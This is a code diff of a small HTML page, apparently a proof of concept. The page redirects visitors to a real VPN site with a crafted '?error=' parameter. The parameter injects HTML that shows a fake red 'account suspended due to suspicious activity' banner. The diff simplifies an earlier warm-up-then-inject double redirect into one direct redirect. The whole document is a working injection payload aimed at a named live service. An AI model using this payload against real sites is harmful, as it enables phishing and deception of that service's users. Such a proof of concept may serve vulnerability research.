@@ -2,29 +2,16 @@
 <html>
   <head>
     <meta charset="UTF-8">
-    <title>Step 1: Initializing session...</title>
+    <title>Redirecting...</title>
     <script>
-      // Step 1: Redirect to base site to set cookies/session
-      const warmup = "https://vpn.mobilevikings.be/";
-
-      // Step 2: After warmup, inject payload using ?error=
       const payload = encodeURIComponent(
-        '\"><div style=\"color:red;font-weight:bold\">Your account has been suspended due to suspicious activity.</div>'
+        '\"><div style="color:red;font-weight:bold">Your account has been suspended due to suspicious activity.</div>'
       );
-      const finalTarget = "https://vpn.mobilevikings.be/?error=" + payload;
-
-      // Start warm-up phase
-      setTimeout(() => {
-        window.location.href = warmup;
-        
-        // Second redirect (payload) after a delay to ensure cookies are set
-        setTimeout(() => {
-          window.location.href = finalTarget;
-        }, 2000); // delay between warmup and final injection
-      }, 100); // small delay to ensure script stability
+      const target = "https://vpn.mobilevikings.be/?error=" + payload;
+      location.href = target;
     </script>
   </head>
   <body>
-    <p>Initializing... Please wait.</p>
+    <p>Redirecting...</p>
   </body>
 </html>
